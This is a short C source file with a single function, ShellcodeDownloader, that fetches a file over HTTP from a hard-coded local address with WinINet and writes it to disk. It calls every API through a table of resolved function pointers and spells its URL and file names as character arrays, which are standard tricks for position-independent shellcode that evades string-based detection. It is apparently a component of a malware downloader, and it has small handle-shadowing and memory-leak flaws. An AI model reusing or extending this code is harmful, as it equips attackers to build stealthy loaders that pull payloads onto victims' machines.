#include"header.h"
#include"api.h"


//定义想要实现的功能函数
BOOL ShellcodeDownloader(PFUNCTIONS pFn)
{
	BYTE* Temp = (BYTE*)pFn->fn_malloc(1024);
	pFn->fn_memset(Temp, 0, 1024);
	ULONG Number = 1;
	FILE* stream;

	HINTERNET hSession = pFn->fn_InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	char szUrl[] = { 'h','t','t','p',':','/','/','1','2','7','.','0','.','0','.','1',':','8','0','0','0','/','i','d','i','o','t','.','t','x','t',0 };
	HINTERNET hHttp = NULL;
	if (hSession != NULL)
	{
		HINTERNET hHttp = pFn->fn_InternetOpenUrlA(hSession, szUrl, NULL, 0, INTERNET_FLAG_DONT_CACHE, 0);
		if (hHttp == NULL) 
			return FALSE;

		char szOutputFile[] = { 'o','u','t','p','u','t','.','t','x','t',0 };
		char szOpenMode[] = { 'w','b',0 };
		pFn->fn_fopen_s(&stream, szOutputFile, szOpenMode);
		if (stream == NULL) {
			pFn->fn_InternetCloseHandle(hHttp);
			hHttp = NULL;
			return FALSE;
		}

		while (Number > 0) {
			BOOL bReadFile = pFn->fn_InternetReadFile(hHttp, Temp, 1024 - 1, &Number);
			if (bReadFile == FALSE) {
				pFn->fn_InternetCloseHandle(hHttp);
				hHttp = NULL;
				break;
			}
			pFn->fn_fwrite(Temp, sizeof(char), Number, stream);
		}

		pFn->fn_InternetCloseHandle(hSession);
		hSession = NULL;
		pFn->fn_free(Temp);
		pFn->fn_fclose(stream);
	}
	return TRUE;
}
